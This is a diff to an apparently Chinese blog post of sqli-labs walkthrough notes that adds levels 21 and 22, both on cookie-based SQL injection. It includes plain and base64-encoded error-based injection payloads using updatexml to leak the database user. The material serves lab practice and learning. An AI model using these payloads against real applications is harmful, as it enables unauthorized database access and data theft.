@@ -1,5 +1,5 @@
 ---
- title: Sqlilabs通关笔记(18-20)数据头注入
+ title: Sqlilabs通关笔记(18-22)数据头注入
  date: 2020-01-07 12:32:50
  tags: SQL注入
  categories: SQL注入
@@ -50,6 +50,21 @@
 > Cookie: uname=admin' and (updatexml(1,concat(0x7e,user(),0x7e),1)) and '1' = '1
 
 ![2020-1-7-13-19-53](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-19-53)
+
+## 第二十一关 基于base64编码单引号的Cookie注入
+1.同理，本关的注入点在cookie参数，和上一关payload一样只是编码方式不同
+
+> uname=YWRtaW4nIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdXNlcigpLDB4N2UpLDEpKSBhbmQgJzEnID0gJzE%3d
+
+![2020-1-7-15-43-41](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-15-43-41)
+
+## 第二十二关 基于base64编码加密的双引号Cookie注入
+
+1.同理，本关的注入点在cookie参数，和上一关payload一样只是双引号闭合方式
+
+> uname=YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdXNlcigpLDB4N2UpLDEpKSBhbmQgIjEiID0gIjE%3d
+
+![2020-1-7-15-49-59](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-15-49-59)
 
 ### SQLMAP注入
 
